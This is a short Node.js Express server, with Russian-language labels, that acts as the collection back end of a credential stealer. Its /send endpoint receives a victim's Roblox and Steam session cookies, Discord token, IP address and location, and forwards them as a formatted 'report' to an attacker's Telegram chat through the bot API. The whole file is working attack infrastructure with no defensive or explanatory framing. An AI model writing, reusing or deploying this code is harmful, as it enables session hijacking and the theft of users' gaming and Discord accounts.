const express = require('express');
const axios = require('axios');
const cors = require('cors');
const app = express();

app.use(cors());
app.use(express.json({ limit: '10mb' }));

const TOKEN = process.env.TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const API = "https://api.telegram.org/bot" + TOKEN;

app.post('/send', async (req, res) => {
  try {
    const {
      robloxCookie, steamCookie, discordToken,
      robloxStatus, steamStatus, discordStatus,
      ip, country, city
    } = req.body;

    let msg = "🔴 <b>⚠️ ОТЧЁТ</b>\n\n━━━━━━━━━━━━━━━━━━\n\n";
    msg += "🌐 <b>IP:</b> <code>" + (ip || "Н/Д") + "</code>\n";
    msg += "📍 <b>Страна:</b> <code>" + (country || "Н/Д") + "</code>\n";
    msg += "🏙 <b>Город:</b> <code>" + (city || "Н/Д") + "</code>\n\n━━━━━━━━━━━━━━━━━━\n\n";

    // Roblox
    msg += "🍪 <b>ROBLOX COOKIE:</b>\n";
    if (robloxStatus === "new") msg += "<code>" + robloxCookie + "</code>\n\n";
    else if (robloxStatus === "sent") msg += "✅ Уже отправлен\n\n";
    else msg += "❌ Не найден\n\n";

    // Steam
    msg += "🎮 <b>STEAM COOKIE:</b>\n";
    if (steamStatus === "new") msg += "<code>" + steamCookie + "</code>\n\n";
    else if (steamStatus === "sent") msg += "✅ Уже отправлен\n\n";
    else msg += "❌ Не найден\n\n";

    // Discord
    msg += "💬 <b>DISCORD TOKEN:</b>\n";
    if (discordStatus === "new") msg += "<code>" + discordToken + "</code>\n\n";
    else if (discordStatus === "sent") msg += "✅ Уже отправлен\n\n";
    else msg += "❌ Discord не открыт\n\n";

    msg += "━━━━━━━━━━━━━━━━━━\n⏰ <b>Время:</b> " + new Date().toLocaleString("ru-RU");

    await axios.post(API + "/sendMessage", {
      chat_id: CHAT_ID,
      text: msg,
      parse_mode: "HTML"
    });

    res.json({ ok: true });
  } catch (e) {
    res.status(500).json({ ok: false, error: e.message });
  }
});

app.listen(process.env.PORT || 3000);
